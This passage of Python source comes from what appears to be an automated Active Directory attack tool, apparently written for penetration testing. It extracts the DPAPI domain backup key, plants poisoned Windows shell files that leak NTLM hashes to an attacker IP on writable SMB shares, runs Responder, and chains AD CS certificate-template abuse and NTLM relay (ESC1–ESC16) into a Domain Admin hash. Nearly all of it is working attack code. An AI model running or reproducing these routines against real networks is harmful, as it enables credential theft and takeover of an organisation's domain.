                _shutil.copy2(str(pvk), str(pvk_output))
                pvk_found = True
                ok(f"DPAPI backup key saved: {pvk_output}")
                break
            except Exception as e:
                log.warning(f"Failed to copy PVK file: {e}")
        if pvk_found:
            break

    # Also check output text and saved output file for key material
    output_text = result.stdout or ""
    backup_txt = cfg.work_dir / "dpapi-backup.txt"
    if backup_txt.exists():
        output_text += backup_txt.read_text()
    if "Exporting private key" in output_text or "backupkey" in output_text.lower() or pvk_found:
        success_box("DPAPI domain backup key extracted!")
        detail("This key decrypts ALL user DPAPI secrets (credentials, certificates, etc.)")
        detail("Usage: dpapi.py masterkey -file <masterkey> -pvk dpapi-backupkey.pvk")
        detail("Then:  dpapi.py credential -file <blob> -key <decrypted_key>")
        return True

    if re.search(r"backup.*key|domain.*key|private.*key", output_text, re.IGNORECASE):
        ok("DPAPI backup key data retrieved (check output for key material)")
        return True

    log.warning("DPAPI backup key extraction did not produce expected output")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NTLM Theft File Drops (CVE-2025-24054 / CVE-2024-21320)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _craft_ntlm_theft_files(attacker_ip: str, work_dir: Path) -> list[Path]:
    """Craft poisoned files that trigger NTLM authentication when a user browses a share."""
    theft_dir = work_dir / "ntlm-theft"
    theft_dir.mkdir(exist_ok=True)
    files = []

    # desktop.ini — triggers when folder is browsed in Explorer
    ini_path = theft_dir / "desktop.ini"
    ini_path.write_text(
        f"[.ShellClassInfo]\n"
        f"IconResource=\\\\{attacker_ip}\\share\\icon.ico\n"
    )
    files.append(ini_path)

    # .library-ms — triggers on folder browse (Windows Library format)
    lib_path = theft_dir / "Documents.library-ms"
    lib_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n'
        '  <name>@shell32.dll,-34575</name>\n'
        '  <version>2</version>\n'
        '  <isLibraryPinned>true</isLibraryPinned>\n'
        '  <iconReference>imageres.dll,-1003</iconReference>\n'
        '  <searchConnectorDescriptionList>\n'
        '    <searchConnectorDescription>\n'
        '      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n'
        f'      <simpleLocation><url>\\\\{attacker_ip}\\share</url></simpleLocation>\n'
        '    </searchConnectorDescription>\n'
        '  </searchConnectorDescriptionList>\n'
        '</libraryDescription>\n'
    )
    files.append(lib_path)

    # .theme — triggers when file is previewed or opened
    theme_path = theft_dir / "company.theme"
    theme_path.write_text(
        "[Theme]\n"
        "DisplayName=Corporate Theme\n"
        f"BrandImage=\\\\{attacker_ip}\\share\\bg.jpg\n"
        "\n"
        "[Control Panel\\Desktop]\n"
        f"Wallpaper=\\\\{attacker_ip}\\share\\wallpaper.jpg\n"
    )
    files.append(theme_path)

    # .url — triggers when icon is loaded by Explorer
    url_path = theft_dir / "important.url"
    url_path.write_text(
        "[InternetShortcut]\n"
        "URL=https://example.com\n"
        f"IconFile=\\\\{attacker_ip}\\share\\icon.ico\n"
        "IconIndex=0\n"
    )
    files.append(url_path)

    # .searchConnector-ms — triggers on folder browse
    sc_path = theft_dir / "Search.searchConnector-ms"
    sc_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">\n'
        '  <description>Search Connector</description>\n'
        f'  <simpleLocation><url>\\\\{attacker_ip}\\share</url></simpleLocation>\n'
        '</searchConnectorDescription>\n'
    )
    files.append(sc_path)

    ok(f"Crafted {len(files)} NTLM theft file(s) in {theft_dir}")
    return files


def _find_writable_shares(cfg: Config) -> list[tuple[str, str]]:
    """Discover writable SMB shares on the network. Returns list of (host, share) tuples."""
    shares = []
    target = cfg.specific_target or cfg.target_net
    if not target:
        log.warning("No target for share enumeration")
        return []

    log.info(f"Enumerating writable SMB shares on {target}...")
    shares_output = cfg.work_dir / "writable-shares.txt"

    if cfg.has_creds:
        cmd = ["nxc", "smb", target]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["--shares"]
    else:
        cmd = ["nxc", "smb", target, "--shares", "-u", "", "-p", ""]

    result = run(cmd, cfg, timeout=120, outfile=shares_output)
    if result.returncode != 0:
        log.warning("Share enumeration failed")
        return []

    # Parse nxc output for writable shares
    # Format: SMB  10.0.0.1  445  DC01  ShareName  READ,WRITE  Comment
    for line in (result.stdout or "").splitlines():
        if "WRITE" in line.upper():
            parts = line.split()
            # Find the IP (second field after SMB marker)
            ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
            if ip_match:
                host = ip_match.group(1)
                # Find share name — usually comes after the hostname
                share_match = re.search(
                    r"\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+(\S+)\s+.*WRITE",
                    line, re.IGNORECASE
                )
                if share_match:
                    share_name = share_match.group(1)
                    # Skip default admin shares
                    if share_name.upper() not in ("C$", "ADMIN$", "IPC$"):
                        shares.append((host, share_name))

    if shares:
        ok(f"Found {len(shares)} writable share(s)")
        for host, share in shares:
            detail(f"  \\\\{host}\\{share}")
    else:
        log.warning("No writable shares found")

    return shares


def _drop_file_on_share(host: str, share: str, local_file: Path,
                        remote_name: str, cfg: Config) -> bool:
    """Drop a file onto a writable SMB share."""
    log.info(f"  Dropping {remote_name} on \\\\{host}\\{share}")

    if cfg.has_creds:
        cmd = ["nxc", "smb", host]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["--put-file", str(local_file), remote_name]
        result = run(cmd, cfg, timeout=30)
    else:
        # Null session via smbclient
        if not tool_exists("smbclient"):
            log.warning("smbclient not found for null session upload")
            return False
        result = run(
            ["smbclient", f"//{host}/{share}", "-N",
             "-c", f"put {local_file} {remote_name}"],
            cfg, timeout=30
        )

    if result.returncode == 0:
        ok(f"  Dropped {remote_name} on \\\\{host}\\{share}")
        return True
    else:
        log.warning(f"  Failed to drop {remote_name} on \\\\{host}\\{share}")
        return False


def run_ntlm_theft(cfg: Config) -> bool:
    """Drop poisoned files on writable SMB shares to capture NTLM hashes."""
    phase_header("NTLM THEFT FILE DROPS (CVE-2025-24054 / CVE-2024-21320)")

    if not cfg.attacker_ip:
        log.error("Attacker IP required for NTLM theft files — use -a")
        return False

    # 1. Craft poisoned files
    theft_files = _craft_ntlm_theft_files(cfg.attacker_ip, cfg.work_dir)
    if not theft_files:
        log.error("Failed to craft NTLM theft files")
        return False

    # 2. Find writable shares
    writable_shares = _find_writable_shares(cfg)
    if not writable_shares:
        log.warning("No writable shares found — cannot drop NTLM theft files")
        return False

    # 3. Drop files on shares
    drops_file = cfg.work_dir / "ntlm-theft-drops.txt"
    dropped = 0
    with open(drops_file, "w") as f:
        for host, share in writable_shares:
            for theft_file in theft_files:
                remote_name = theft_file.name
                if _drop_file_on_share(host, share, theft_file, remote_name, cfg):
                    f.write(f"\\\\{host}\\{share}\\{remote_name}\n")
                    dropped += 1

    if dropped == 0:
        log.warning("Failed to drop any NTLM theft files")
        return False

    ok(f"Dropped {dropped} file(s) across {len(writable_shares)} share(s)")
    detail(f"Drops tracked in: {drops_file}")

    # 4. Start Responder to capture hashes (if ntlmrelayx isn't already running)
    iface = cfg.iface or "eth0"
    bg_procs = []
    captured = False

    try:
        # Check if ntlmrelayx is already running (port conflict with Responder)
        ntlmrelayx_running = False
        try:
            check = subprocess.run(
                ["pgrep", "-f", "ntlmrelayx"], capture_output=True, text=True, timeout=5
            )
            ntlmrelayx_running = check.returncode == 0
        except Exception:
            pass

        if ntlmrelayx_running:
            log.info("ntlmrelayx already running — relying on it for hash capture")
            detail("Hashes will appear in ntlmrelayx output when users browse poisoned shares")
        elif tool_exists("responder"):
            log.info(f"Starting Responder on {iface} to capture NTLM hashes...")
            resp_output = cfg.work_dir / "responder-theft.txt"
            resp_proc = run(
                ["responder", "-I", iface, "-wv"],
                cfg, bg=True, outfile=resp_output
            )
            if hasattr(resp_proc, 'poll'):
                bg_procs.append(resp_proc)
        else:
            log.warning("No Responder available — hashes will only be captured if ntlmrelayx is running")

        # 5. Wait briefly for hash captures
        ok("NTLM theft files deployed — waiting for users to browse shares...")
        max_wait = min(cfg.poison_duration, 120)
        waited = 0
        while waited < max_wait:
            # Check Responder logs for captures
            resp_logs = Path("/usr/share/responder/logs")
            if resp_logs.is_dir():
                for logf in resp_logs.glob("*NTLMv2*.txt"):
                    if logf.stat().st_mtime > cfg.start_time:
                        content = logf.read_text()
                        if "::" in content:
                            ok("Captured NTLM hash via theft file!")
                            captured = True
                            break
            if captured:
                break
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"Listening for NTLM theft responses... ({waited}/{max_wait}s)")

        # Extract hashes
        extract_hashes(cfg)

        if captured:
            success_box("NTLM theft file drops captured authentication!")
        else:
            log.info("No immediate captures — files remain on shares for passive collection")
            detail("Users browsing the shares will trigger NTLM authentication to your IP")

        return captured

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AD CS Enumeration — Certihound (ESC1-17) with certipy fallback
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _certihound_find(cfg: Config) -> Optional[dict]:
    """Enumerate ADCS via Certihound. Returns {vulns, ca_name, ca_host} or None on failure.

    vulns: list[tuple[str, str]] of (ESC_type, template_name).
    NT hash auth unsupported — falls back to certipy when nthash-only auth is used.
    """
    if not tool_exists("certihound"):
        return None
    if cfg.nthash and not cfg.password:
        log.info("Certihound does not support NT-hash auth — falling back to certipy")
        return None

    out_dir = cfg.work_dir / "certihound"
    out_dir.mkdir(exist_ok=True)

    cmd = ["certihound", "-d", cfg.domain, "-u", cfg.username,
           "-p", cfg.password, "--dc", cfg.dc_ip,
           "-o", str(out_dir), "--format", "both"]

    log.info("🔍 Enumerating AD CS with Certihound...")
    if cfg.dry_run:
        # Don't write openssl-legacy.cnf and don't mutate process env
        # in dry-run; let the run() helper print the [DRY RUN] line.
        result = run(cmd, cfg, timeout=180)
    else:
        # OpenSSL 3 disables MD4 by default on Debian/Ubuntu — NTLM needs it
        env_prev = os.environ.get("OPENSSL_CONF")
        legacy_conf = out_dir / "openssl-legacy.cnf"
        legacy_conf.write_text(
            "openssl_conf = openssl_init\n"
            "[openssl_init]\nproviders = provider_sect\n"
            "[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n"
            "[default_sect]\nactivate = 1\n"
            "[legacy_sect]\nactivate = 1\n"
        )
        os.environ["OPENSSL_CONF"] = str(legacy_conf)
        try:
            result = run(cmd, cfg, timeout=180)
        finally:
            if env_prev is None:
                os.environ.pop("OPENSSL_CONF", None)
            else:
                os.environ["OPENSSL_CONF"] = env_prev

    if result.returncode != 0:
        log.warning("Certihound enumeration failed — falling back to certipy")
        return None

    # 1. Parse the structured vulnerabilities report
    vulns: list[tuple[str, str]] = []
    ca_name = cfg.ca_name or ""
    ca_host = ""

    try:
        for vf in sorted(out_dir.glob("*_vulnerabilities.json")):
            data = json.loads(vf.read_text())
            for item in data.get("vulnerabilities", []):
                esc = str(item.get("type", "")).upper()
                tmpl = item.get("template") or item.get("ca") or "unknown"
                if esc.startswith("ESC"):
                    vulns.append((esc, tmpl))
                    if not ca_name and item.get("ca"):
                        ca_name = item["ca"]
    except Exception as e:
        log.warning(f"Certihound vulnerabilities parse error: {e}")

    # 2. Parse enterprise CA file for DNS hostname
    try:
        for cf in sorted(out_dir.glob("*_enterprisecas.json")):
            data = json.loads(cf.read_text())
            for node in data.get("data", []):
                props = node.get("Properties", {})
                if not ca_name:
                    ca_name = props.get("caname", "")
                if not ca_host:
                    ca_host = props.get("dnshostname", "")
                if ca_host:
                    break
    except Exception as e:
        log.warning(f"Certihound CA parse error: {e}")

    # Dedupe while preserving order
    seen = set()
    deduped = []
    for v in vulns:
        if v not in seen:
            seen.add(v)
            deduped.append(v)

    if not deduped:
        log.warning("Certihound ran but detected no ESC vulnerabilities")
        return None

    if not ca_host and cfg.dc_ip:
        ca_host = cfg.dc_ip

    ok(f"Certihound: {len(deduped)} vulnerability/ies detected (CA: {ca_name or '?'})")
    return {"vulns": deduped, "ca_name": ca_name, "ca_host": ca_host}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AD CS Exploitation (ESC1-ESC16 via certipy; ESC5/ESC17 detection-only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _adcs_esc9_esc10_attack(template: str, ca_name: str, esc_type: str,
                            cfg: Config, pfx_stem: Path,
                            pfx_path: Path) -> Optional[str]:
    """ESC9/ESC10 UPN-swap attack — bypasses CVE-2022-26923 SID binding.

    Requires a victim account whose UPN we can write. Caller controls
    the victim via --esc-victim USER:PASS. Always restores UPN in finally.
    """
    if not cfg.esc_victim_user or not cfg.esc_victim_password:
        log.warning(f"  {esc_type} requires --esc-victim USER:PASS (controllable account)")
        detail("  Hint: pick a user you have GenericWrite on, or whose password you reset")
        return None

    victim = cfg.esc_victim_user
    victim_pwd = cfg.esc_victim_password
    log.info(f"  Exploiting {esc_type} via UPN swap: victim={victim} → impersonate Administrator")

    # Caller's own creds (used for the LDAP UPN write; presupposes WriteProperty on victim)
    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
    if cfg.nthash:
        auth_args += ["-hashes", f":{cfg.nthash}"]
    else:
        auth_args += ["-p", cfg.password]

    # 1. Read original UPN so we can restore it
    read_cmd = ["certipy", "account"] + auth_args + ["-user", victim, "read"]
    read_result = run(read_cmd, cfg, timeout=60)
    orig_upn_match = re.search(r"userPrincipalName\s*:\s*(\S+)", read_result.stdout or "")
    orig_upn = orig_upn_match.group(1) if orig_upn_match else ""
    detail(f"  Original UPN of {victim}: {orig_upn or '<unset>'}")

    # 2. Swap UPN to "Administrator" (sAMAccountName form, no @domain)
    log.info(f"  Setting {victim}.userPrincipalName = Administrator")
    swap_cmd = ["certipy", "account"] + auth_args + [
        "-user", victim, "-upn", "Administrator", "update"
    ]
    swap_result = run(swap_cmd, cfg, timeout=60)
    if swap_result.returncode != 0:
        log.warning(f"  {esc_type}: Failed to update UPN — need WriteProperty on {victim}")
        return None

    pfx = None
    try:
        # 3. Enroll cert as victim (uses victim's password, not ours)
        log.info(f"  Enrolling cert as {victim}@{cfg.domain} via template '{template}'...")
        enroll_cmd = [
            "certipy", "req",
            "-u", f"{victim}@{cfg.domain}", "-p", victim_pwd,
            "-dc-ip", cfg.dc_ip,
            "-ca", ca_name, "-template", template,
            "-out", str(pfx_stem)
        ]
        enroll_result = run(enroll_cmd, cfg, timeout=120)
        if enroll_result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Cert enrolled as {victim} with SAN=Administrator")
            pfx = str(pfx_path)
        else:
            log.warning(f"  {esc_type}: Cert enrollment failed")
    finally:
        # 4. ALWAYS restore UPN — even on exception, even if enrollment failed
        log.info(f"  Restoring {victim}.userPrincipalName")
        restore_cmd = ["certipy", "account"] + auth_args + [
            "-user", victim, "-upn", orig_upn or "", "update"
        ]
        restore_result = run(restore_cmd, cfg, timeout=60)
        if restore_result.returncode == 0:
            ok(f"  {esc_type}: UPN restored to '{orig_upn or '<unset>'}'")
        else:
            log.error(f"  {esc_type}: FAILED TO RESTORE UPN — manually set "
                      f"{victim}.userPrincipalName = '{orig_upn}'")

    return pfx


def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
                           cfg: Config) -> Optional[str]:
    """Exploit a vulnerable AD CS template. Returns PFX path on success, None on failure."""
    # certipy appends ".pfx" automatically, so pass the stem without extension
    pfx_stem = cfg.work_dir / f"adcs-{esc_type}-{template}"
    pfx_path = Path(str(pfx_stem) + ".pfx")

    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
    if cfg.nthash:
        auth_args += ["-hashes", f":{cfg.nthash}"]
    else:
        auth_args += ["-p", cfg.password]

    if esc_type in ("ESC1", "ESC2", "ESC3", "ESC6"):
        # Direct template abuse — request cert with admin UPN
        log.info(f"  Exploiting {esc_type} via template '{template}'...")
        cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", template,
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(cmd, cfg, timeout=120)
        if result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Certificate obtained via template '{template}'")
            return str(pfx_path)

    elif esc_type == "ESC4":
        # Modify template → exploit as ESC1 → ALWAYS restore (try/finally).
        # certipy `-save-old` writes <template>.json to the CURRENT WORKING
        # DIRECTORY, not cfg.work_dir. We must chdir into work_dir for
        # both save and restore so the file lands and is found in the
        # same place. Without this, the restore silently no-ops and the
        # template stays vulnerable indefinitely — a major hazard on
        # customer environments.
        log.info(f"  Exploiting ESC4: modifying template '{template}' to enable ESC1...")
        prev_cwd = os.getcwd()
        try:
            os.chdir(cfg.work_dir)
            save_cmd = (
                ["certipy", "template"] + auth_args +
                ["-template", template, "-save-old"]
            )
            result = run(save_cmd, cfg, timeout=60)
            if result.returncode != 0:
                log.warning(f"  ESC4: Failed to modify template '{template}'")
                return None

            pfx = None
            try:
                # Now exploit as ESC1
                pfx = _adcs_exploit_template(template, ca_name, "ESC1", cfg)
            finally:
                # ALWAYS restore original template, even on exception.
                # certipy wrote the .json into cfg.work_dir (we chdir'd).
                log.info(f"  ESC4: Restoring original template configuration...")
                old_config = cfg.work_dir / f"{template}.json"
                if old_config.exists():
                    restore_cmd = (
                        ["certipy", "template"] + auth_args +
                        ["-template", template, "-configuration", str(old_config)]
                    )
                    run(restore_cmd, cfg, timeout=60)
                    ok(f"  ESC4: Template '{template}' restored")
                else:
                    log.error(f"  ESC4: Cannot restore — {old_config} not found! "
                              f"Template may be left modified! Manually run: "
                              f"certipy template ... -template {template} -save-old")
        finally:
            os.chdir(prev_cwd)

        return pfx

    elif esc_type in ("ESC9", "ESC10"):
        # ESC9: template has CT_FLAG_NO_SECURITY_EXTENSION (no SID ext in cert)
        # ESC10: DC has weak cert mapping (StrongCertificateBindingEnforcement=0
        #        or CertificateMappingMethods has 0x4/UPN flag)
        # Both bypass CVE-2022-26923 by relying on UPN-based KDC mapping:
        #   1. Swap a victim user's UPN to "Administrator"
        #   2. Enroll cert as victim → cert SAN = "Administrator"
        #   3. Restore UPN
        #   4. PKINIT — KDC has no SID to bind against, falls back to UPN match
        return _adcs_esc9_esc10_attack(template, ca_name, esc_type, cfg, pfx_stem, pfx_path)

    elif esc_type == "ESC7":
        # CA officer abuse — enable SubCA template, request, approve
        log.info(f"  Exploiting ESC7: enabling SubCA template on CA '{ca_name}'...")
        enable_cmd = (
            ["certipy", "ca"] + auth_args +
            ["-ca", ca_name, "-enable-template", "SubCA"]
        )
        result = run(enable_cmd, cfg, timeout=60)
        if result.returncode != 0:
            log.warning("  ESC7: Failed to enable SubCA template")
            return None

        # Request SubCA cert
        req_cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", "SubCA",
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(req_cmd, cfg, timeout=120)
        # ESC7 may require approval — check for request ID
        req_id_match = re.search(r"Request ID(?:\s*is)?\s*:?\s*(\d+)", result.stdout or "")
        if req_id_match:
            req_id = req_id_match.group(1)
            log.info(f"  ESC7: Approving request ID {req_id}...")
            approve_cmd = (
                ["certipy", "ca"] + auth_args +
                ["-ca", ca_name, "-issue-request", req_id]
            )
            run(approve_cmd, cfg, timeout=60)
            # Retrieve the cert
            retrieve_cmd = (
                ["certipy", "req"] + auth_args +
                ["-ca", ca_name, "-retrieve", req_id,
                 "-out", str(pfx_stem)]
            )
            result = run(retrieve_cmd, cfg, timeout=60)

        if pfx_path.exists():
            ok(f"  ESC7: Certificate obtained via SubCA")
            return str(pfx_path)

    else:
        # Generic attempt for ESC13, ESC15, etc.
        log.info(f"  Attempting generic {esc_type} exploit on template '{template}'...")
        cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", template,
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(cmd, cfg, timeout=120)
        if result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Certificate obtained via template '{template}'")
            return str(pfx_path)

    log.warning(f"  {esc_type} exploitation failed for template '{template}'")
    return None


def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
    """Exploit ESC8 (HTTP web enrollment) via NTLM relay to CA web service."""
    phase_header("AD CS ESC8 — HTTP Enrollment Relay")

    pfx_path = cfg.work_dir / "adcs-esc8.pfx"
    relay_output = cfg.work_dir / "adcs-esc8-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx targeting the CA web enrollment
        log.info(f"Starting ntlmrelayx targeting http://{ca_host}/certsrv/certfnsh.asp...")
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"http://{ca_host}/certsrv/certfnsh.asp",
            "--adcs", "--template", "Machine",
            "-smb2support",
        ]
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for ESC8")
            return None
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error("ntlmrelayx exited immediately for ESC8 relay")
            return None

        ok(f"ESC8 relay listener active on {ca_host}")

        # Trigger coercion against DC to relay to CA
        if cfg.dc_ip and cfg.has_creds:
            log.info("Triggering DC authentication coercion for ESC8 relay...")
            try_dc_coercion(cfg.attacker_ip, cfg)

        # Wait for relay to capture certificate
        max_wait = 60
        waited = 0
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                # Look for base64 certificate in output
                cert_match = re.search(
                    r"Certificate.*?base64|Got certificate|-----BEGIN CERTIFICATE",
                    content, re.IGNORECASE
                )
                if cert_match:
                    ok("ESC8: Certificate captured via relay!")
                    # Extract and save PFX
                    pfx_match = re.search(r"Saved PFX.*?to\s+(\S+\.pfx)", content)
                    if pfx_match:
                        captured_pfx = Path(pfx_match.group(1))
                        if captured_pfx.exists():
                            import shutil as _shutil
                            _shutil.copy2(str(captured_pfx), str(pfx_path))
                            return str(pfx_path)
                    return str(pfx_path) if pfx_path.exists() else None
            time.sleep(3)
            waited += 3

        log.warning("ESC8 relay: No certificate captured within timeout")
        return None

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
    """Authenticate with a PFX certificate to obtain NT hash via PKINIT.

    Tries to authenticate as administrator (the cert SAN); on patched DCs
    (CVE-2022-26923 SID binding) this falls back to whoever the requestor
    was. The actual recovered identity is parsed from certipy's output.
    """
    if not tool_exists("certipy"):
        log.warning("certipy not found — cannot authenticate with PFX")
        return False

    log.info(f"Authenticating with certificate: {pfx_path}")
    auth_output = cfg.work_dir / "adcs-auth.txt"

    # Force username=administrator so PAC lookup targets DA on unpatched DCs
    result = run(
        ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip,
         "-username", "administrator", "-domain", cfg.domain],
        cfg, timeout=120, outfile=auth_output
    )

    output = result.stdout or ""
    if auth_output.exists():
        output += auth_output.read_text()

    # Preferred: parse "Got hash for 'USER@DOMAIN': LM:NT" — gives us the real identity
    m = re.search(
        r"Got hash for '([^@']+)@[^']*'\s*:\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
        output
    )
    if m:
        recovered_user, nt_hash = m.group(1), m.group(2)
        cfg.username = recovered_user
        cfg.nthash = nt_hash
        cfg.password = ""
        is_admin = recovered_user.lower() in ("administrator", "admin")
        if is_admin:
            success_box("AD CS: Domain Admin NT hash recovered!")
        else:
            ok(f"AD CS: NT hash recovered for {recovered_user} (CVE-2022-26923 SID binding "
               f"prevented impersonation as administrator)")
        detail(f"User: {recovered_user}  NT: {nt_hash}")
        return is_admin  # only signal success if we actually got DA

    # Fallback: legacy regex without username context
    hash_match = re.search(r"(?:NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})", output, re.IGNORECASE)
    if hash_match:
        cfg.nthash = hash_match.group(1)
        log.warning(f"Recovered NT hash {cfg.nthash} but could not determine identity — "
                    f"assuming current user")
        return False

    log.warning("Failed to recover NT hash from certificate authentication")
    return False


def run_adcs_attack(cfg: Config) -> bool:
    """Exploit AD CS vulnerable certificate templates for domain escalation."""
    phase_header("AD CS EXPLOITATION (ESC1-ESC17 detect / ESC1-ESC16 exploit)")

    if not tool_exists("certipy"):
        log.error("certipy not found — install with: apt install certipy-ad")
        return False

    if not cfg.has_creds:
        log.error("AD CS exploitation requires domain credentials (-u/-p)")
        return False

    # Priority order for exploitation (ESC5/ESC17 are detection-only — no exploiter)
    esc_priority = ["ESC1", "ESC8", "ESC4", "ESC6", "ESC7", "ESC13", "ESC15",
                    "ESC2", "ESC3", "ESC9", "ESC10", "ESC11", "ESC14", "ESC16",
                    "ESC5", "ESC17"]
    detect_only = {"ESC5", "ESC12", "ESC17"}

    # 1a. Try Certihound first (broader coverage + BloodHound CE export)
    ch_result = _certihound_find(cfg)
    if ch_result:
        vulnerabilities = ch_result["vulns"]
        ca_name = cfg.ca_name or ch_result["ca_name"]
        ca_host = ch_result["ca_host"]
    else:
        # 1b. Fallback to certipy find
        log.info("Enumerating AD CS certificate templates with certipy...")
        enum_output = cfg.work_dir / "adcs-enum.txt"

        auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
        if cfg.nthash:
            auth_args += ["-hashes", f":{cfg.nthash}"]
        else:
            auth_args += ["-p", cfg.password]

        result = run(
            ["certipy", "find"] + auth_args +
            ["-vulnerable", "-stdout", "-json", "-output", str(cfg.work_dir / "adcs-enum")],
            cfg, timeout=180, outfile=enum_output
        )

        output = result.stdout or ""
        if enum_output.exists():
            output = enum_output.read_text()

        if result.returncode != 0 and not output:
            log.error("certipy enumeration failed — check credentials and connectivity")
            return False

        vulnerabilities = []

        # Extract CA name
        ca_match = re.search(r"CA Name\s*:\s*(.+)", output)
        ca_name = cfg.ca_name or (ca_match.group(1).strip() if ca_match else "")

        # Extract CA host for ESC8 — look for DNS Name or CA server hostname
        ca_host = ""
        for pattern in [
            r"DNS Name\s*:\s*(\S+)",
            r"CA DNS\s*:\s*(\S+)",
            r"dNSHostName\s*:\s*(\S+)",
            r"Certificate Authority\s*:.*?DNS Name\s*:\s*(\S+)",
        ]:
            m = re.search(pattern, output, re.IGNORECASE | re.DOTALL)
            if m and m.group(1).lower() not in ("enabled", "disabled", "true", "false"):
                ca_host = m.group(1).strip()
                break
        if not ca_host and cfg.dc_ip:
            ca_host = cfg.dc_ip

        # Find all ESC vulnerabilities with their templates
        template_sections = re.split(r"(?=Template Name\s*:)", output)
        for section in template_sections:
            tmpl_match = re.search(r"Template Name\s*:\s*(\S+)", section)
            if not tmpl_match:
                continue
            template = tmpl_match.group(1)
            for esc in esc_priority:
                if re.search(rf"\b{esc}\b", section):
                    vulnerabilities.append((esc, template))

        # Check for ESC8 (HTTP enrollment) separately
        if re.search(r"Web Enrollment|HTTP.*Enrollment|ESC8", output, re.IGNORECASE):
            if ("ESC8", "WebEnrollment") not in vulnerabilities:
                vulnerabilities.append(("ESC8", "WebEnrollment"))

    if not vulnerabilities:
        log.warning("No vulnerable AD CS templates found")
        return False

    ok(f"Found {len(vulnerabilities)} AD CS vulnerability/ies:")
    for esc, tmpl in vulnerabilities:
        detail(f"  {esc}: {tmpl}")

    if ca_name:
        detail(f"  CA: {ca_name}")

    # 3. Attempt exploitation in priority order
    # Sort by priority
    vuln_sorted = sorted(vulnerabilities,
                         key=lambda v: esc_priority.index(v[0])
                         if v[0] in esc_priority else 99)

    for esc_type, template in vuln_sorted:
        separator()

        if esc_type in detect_only:
            log.warning(f"  {esc_type} detected on '{template}' — no automated exploiter (manual required)")
            continue

        # ESC8 uses relay, not direct exploitation
        if esc_type == "ESC8" and ca_host:
            pfx = _adcs_relay_esc8(ca_host, cfg)
        elif ca_name:
            pfx = _adcs_exploit_template(template, ca_name, esc_type, cfg)
        else:
            log.warning(f"Cannot exploit {esc_type} — CA name not determined")
            continue

        if pfx:
            # 5. Authenticate with PFX to get NT hash
            if _adcs_auth_pfx(pfx, cfg):
                success_box(f"AD CS {esc_type} → Domain Admin via certificate!")
                return True
            else:
                log.warning(f"Got PFX via {esc_type} but PKINIT auth failed — trying next")
                detail(f"PFX saved: {pfx}")
                detail("Manual auth: certipy auth -pfx <file> -dc-ip <dc>")

    log.warning("All AD CS exploitation attempts failed")
    return False


